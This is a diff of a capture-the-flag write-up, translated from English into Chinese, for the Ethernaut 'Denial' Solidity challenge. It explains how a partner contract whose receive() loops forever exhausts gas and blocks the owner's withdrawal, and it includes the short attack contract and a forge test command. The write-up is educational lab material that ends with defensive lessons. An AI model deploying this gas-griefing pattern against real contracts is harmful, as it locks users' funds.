@@ -20,81 +20,70 @@
 
 ## 目标
 
+目的是要阻止 owner 在 withdraw 的时候提取资产
 <img src="../imgs/requirements/20-denial-requirements.webp" width="800px"/>
 
 ## 漏洞
 
 The goal of the Denial challenge is to prevent the owner from withdrawing funds using the `withdraw()` function. How to do that?
 
-Let's take a look at the `withdraw()` function:
+我们看一下 `withdraw()` 函数的实现细节:
 
 ```javascript
 function withdraw() public {
-        uint amountToSend = address(this).balance / 100; // 1% of the contract's balance
-        partner.call{value:amountToSend}(""); // Send to partner using call
-        payable(owner).transfer(amountToSend); // Send to owner using transfer
+        uint amountToSend = address(this).balance / 100; // 1% 的余额
+        partner.call{value:amountToSend}(""); // 发送eth给 partner
+        payable(owner).transfer(amountToSend); //发送eth给 owner 
 
-        // The rest is irrelevant to the solution, but note that the CEI isn't respected
+        //无关代码
         timeLastWithdrawn = block.timestamp;
         withdrawPartnerBalances[partner] +=  amountToSend;
     }
 ```
 
-There are 2 external calls here:
+这里又两个external calls:
 
 - `partner.call{value:amountToSend}("");`
 - `payable(owner).transfer(amountToSend);`
 
-There isn't much we can do with the `transfer` to the owner. However, we know that the `call` function forwards all the remaining gas to the callee. Unfortunately, since the return value isn't checked, simply reverting upon receiving ether wouldn't work. So we have to find another way to break the `withdraw` function.
-
-This can be achieved by using all the remaining gas within the fallback function. By doing so, the `withdraw()` function will never be able to complete its execution. In this case, a useless infinite loop will do the work beautifully:
+给owner转账的 `transfer` 没有什么操作空间. 但是, `call` 转账时，我们可以在`receive()`实现更多的逻辑. 为了不给owner转账，我们只需要在调用`call`时，直接消耗完所有的gas，则会直接错误`outofgas`；这样给owner转账的时候，就会失败了:
 
 ```javascript
-fallback() external payable {
+receive() external payable {
     while (true) {}
 }
 ```
 
 ## 解答
 
-Let's implement the solution accordingly:
+实现攻击合约:
 
 ```javascript
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-interface IDenial {
-    function setWithdrawPartner(address _partner) external;
-}
-
-contract Stop {
-    IDenial idenial;
-
-    constructor(address _denial) {
-        idenial = IDenial(_denial);
-    }
-
-    function becomePartner() public {
-        idenial.setWithdrawPartner(address(this));
-    }
-
-    fallback() external payable {
+contract Attack {
+    receive() external payable {
         while (true) {}
     }
+
+    // receive() external payable {
+    //     revert();
+    // }
 }
 
 ```
 
-Then run the script with the following command:
+你可以在项目的根目录执行以下命令，进行验证：
 
 ```bash
-forge script script/20_Denial.s.sol:PoC --rpc-url sepolia --broadcast --watch
+forge test --match-contract  DenialTest  -vvvvv
 ```
 
 ## 要点
 
-- Always check the return value of the `call` function.
-- A specific amount of gas can be specified when using the `call` function.
+- 需要检测`call` 的返回值.
+- 使用 `call` 的时候，需要指定gas.
 
 <div align="center">
 <br>
